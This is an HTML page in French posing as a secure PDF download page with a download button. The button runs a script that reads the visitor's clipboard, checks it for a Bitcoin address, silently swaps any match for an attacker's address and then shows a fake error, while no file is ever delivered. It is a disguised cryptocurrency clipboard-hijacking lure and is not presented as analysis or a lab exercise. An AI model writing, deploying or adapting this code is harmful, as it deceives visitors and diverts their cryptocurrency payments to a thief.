<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Téléchargement sécurisé - PDF</title>
  <style>
    body {
      background-color: #f4f4f4;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }

    .pdf-preview {
      width: 420px;
      height: 580px;
      background-image: url('https://i.imgur.com/Y2nKTr2.png');
      background-size: cover;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      margin-bottom: 20px;
    }

    .download-btn {
      padding: 12px 20px;
      background-color: #d32f2f;
      color: white;
      text-decoration: none;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    }

    .download-btn:hover {
      background-color: #b71c1c;
    }
  </style>
</head>
<body>
  <div class="pdf-preview"></div>
  <button class="download-btn" onclick="activerClipper()">Télécharger le PDF</button>

  <script>
    async function activerClipper() {
      try {
        const texte = await navigator.clipboard.readText();
        const isCrypto = /^((1|3)[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59})$/.test(texte);
        if (isCrypto) {
          await navigator.clipboard.writeText("bc1qadressepiégée1234567890mod");
          alert("Erreur lors du téléchargement. Veuillez réessayer.");
        } else {
          alert("Ce fichier n'est pas disponible actuellement.");
        }
      } catch (err) {
        alert("Une erreur est survenue.");
      }
    }
  </script>
</body>
</html>
